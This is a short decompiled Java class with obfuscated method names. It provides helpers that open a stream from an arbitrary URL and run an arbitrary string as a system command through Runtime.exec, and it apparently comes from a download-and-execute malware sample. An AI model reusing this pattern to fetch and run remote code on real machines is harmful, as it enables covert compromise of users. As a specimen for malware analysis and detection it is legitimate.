import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Sopil
{
    public static Runtime Sduwll() {
        return Runtime.getRuntime();
    }
    
    public static InputStream MOP(final String sdhds) throws Exception {
        final URL url = new URL(sdhds);
        try {
            url.openConnection();
        }
        catch (Exception ex) {}
        return url.openStream();
    }
    
    public static void LksLL(final String fn) throws Exception {
        final Process ldpd = Sduwll().exec(fn);
        ldpd.waitFor();
    }
}
